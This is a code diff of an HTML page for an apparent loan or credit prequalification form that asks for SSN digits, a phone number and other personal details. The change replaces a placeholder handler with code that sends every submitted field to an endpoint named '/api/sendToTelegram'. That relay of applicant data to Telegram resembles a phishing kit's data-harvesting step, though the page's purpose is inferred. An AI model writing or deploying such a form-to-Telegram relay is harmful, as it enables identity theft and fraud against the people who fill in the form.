@@ -330,44 +330,47 @@
         </div>
     </footer>
 
-    <script>
-        document.getElementById('prequalForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Collect form data
-            const formData = new FormData(this);
-            const data = {};
-            
-            for (let [key, value] of formData.entries()) {
-                data[key] = value;
-            }
-            
-            // Log the data (you can replace this with your actual submission logic)
-            console.log('Form submitted with data:', data);
-            
-            // Show success message
-            document.getElementById('prequalForm').style.display = 'none';
-            document.getElementById('successMessage').classList.remove('hidden');
-            
-            // Here you would typically send the data to your server
-            // Example: fetch('/submit-application', { method: 'POST', body: formData })
+<script>
+document.getElementById('prequalForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const form = this;
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    try {
+        const response = await fetch("/api/sendToTelegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
         });
-        
-        // Format SSN input to only allow numbers
-        document.getElementById('ssnLast4').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-        });
-        
-        // Format phone number
-        document.getElementById('phone').addEventListener('input', function(e) {
-            let value = this.value.replace(/[^0-9]/g, '');
-            if (value.length >= 6) {
-                value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
-            } else if (value.length >= 3) {
-                value = value.replace(/(\d{3})(\d{3})/, '($1) $2');
-            }
-            this.value = value;
-        });
-    </script>
+
+        if (response.ok) {
+            form.style.display = "none";
+            document.getElementById("successMessage").classList.remove("hidden");
+        } else {
+            alert("⚠️ Failed to send form. Please try again.");
+        }
+    } catch (error) {
+        console.error("Telegram send error:", error);
+        alert("❌ Something went wrong. Please try again later.");
+    }
+});
+
+// Formatters (keep these)
+document.getElementById('ssnLast4')?.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+document.getElementById('phone')?.addEventListener('input', function() {
+    let value = this.value.replace(/[^0-9]/g, '');
+    if (value.length >= 6) {
+        value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
+    } else if (value.length >= 3) {
+        value = value.replace(/(\d{3})(\d{3})/, '($1) $2');
+    }
+    this.value = value;
+});
+</script>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'993ce26945fdef49',t:'MTc2MTM0NDY2Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
